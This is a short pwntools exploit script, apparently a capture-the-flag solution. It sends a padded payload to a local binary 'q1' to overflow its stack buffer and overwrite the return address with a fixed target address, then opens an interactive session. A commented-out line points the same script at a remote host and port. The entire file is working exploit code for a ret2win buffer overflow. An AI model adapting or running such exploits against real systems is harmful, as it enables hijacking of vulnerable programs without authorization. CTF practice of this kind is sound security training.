from pwn import *

r = process('./q1')
#r = remote('68.183.158.95', 8989)

target = 0x400769

payload = 'a'*(0xe + 0x8) + p64(target)
r.sendline(payload)

r.interactive()